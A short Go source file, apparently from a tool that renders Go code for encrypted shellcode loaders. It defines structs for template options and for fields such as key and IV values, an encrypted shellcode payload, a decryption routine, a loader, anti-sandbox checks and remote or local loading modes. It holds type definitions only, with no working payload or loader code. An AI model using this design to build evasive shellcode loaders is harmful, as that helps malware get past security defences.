package render

type TmplOpts struct {
	TmplFile     string      // 模板文件路径
	OutputDir    string      // 输出目录路径
	OutputGoName string      // 输出的 Go 文件名
	Data         interface{} // 渲染模板所需的数据
}

type Data struct {
	KeyName    string // key 变量名
	KeyValue   string // key 值
	IvName     string // iv  变量名
	IvValue    string // iv  值
	CipherText string // 保存加密文本的变量名
	PlainText  string // 保存解密文本的变量名
	MethodName string // 函数名
	Payload    string // 加密 shellcode
	Decrypt    string // 解密方法
	Loader     string // loader
	SandBox    string // 反沙箱
	ArgsName   string // 参数加载的变量名
	ArgsValue  string // 参数加载设置的密钥
}

type Load struct {
	Remote string
	Local  string
	Apart  string
}
